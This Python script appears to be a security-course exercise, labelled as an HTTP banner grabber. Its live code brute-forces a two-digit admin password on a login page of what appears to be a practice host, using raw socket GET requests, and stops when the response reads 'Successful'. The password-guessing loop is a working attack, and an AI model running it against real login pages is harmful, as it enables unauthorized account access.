# !/user/bin/python3

# Learn Python HTTP Methods.
# This will show an HTTP GET banner/headers


import socket
# s = socket.socket()


def scan():

    target = 'target1.bowneconsulting.com'

# login2
    # s.connect((target, 80))
    # # s.settimeout(4)
#     req = '''GET /php/login2.php?u=dumbo&p=dumbo HTTP/1.1\r
# Host: target1.bowneconsulting.com\r
# Connection: keep-alive\r
# Upgrade-Insecure-Requests: 1\r
# User-Agent: python\r
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r
# Referer: http://target1.bowneconsulting.com/php/login1.php?u=dumbo&p=dumbo\r
# Accept-Language: en-US,en;q=0.5\r
# \r
# '''
    # # s.connect((target, 80))
    # # req = 'HEAD / HTTP/1.1\r\nHost: ' + target + '\r\n\r\n'
    # s.send(req.encode())
    # print(s.recv(1024).decode())
    # s.close()


# login3
    for num in range(10, 99):
        s = socket.socket()
        print("\r\npassword: ",num)
        s.connect((target, 80))

        req = '''GET /php/login3.php?u=admin&p={} HTTP/1.1\r
Host: target1.bowneconsulting.com\r
Connection: keep-alive\r
Upgrade-Insecure-Requests: 1\r
User-Agent: python\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r
Referer: http://target1.bowneconsulting.com/php/login3.php\r
Accept-Language: en-US,en;q=0.5\r
\r
'''
        req1 = req.format(str(num))
        s.send(req1.encode())
        s.settimeout(2)
        response = s.recv(1024).decode()
        if "Successful" in response:
            print("Response:\r", response)
            break
            s.close()
        else:
            print("nope")

        s.close()
    print("done")

def main():
    print("This will be a HTTP banner/header graber based on port")
    # ip = input("Please enter the IP: ")
    # port = str(input("Please enter the port: "))
    scan()
        
    # option = input("Will this be a port or port range? Enter 'single' or 'range': ")
    # if option == 'single':
    #     port = str(input("Please enter the port: "))
    #     singlePort(ip, port)
    # elif option == 'range':
    #     port1 = str(input("Please enter the starting port: "))
    #     port2 = str(input("Please enter the ending port: "))
    #     portRange(ip, port1, port2)
    # else:
    #     print("invalid input. Please restart and retry")

main()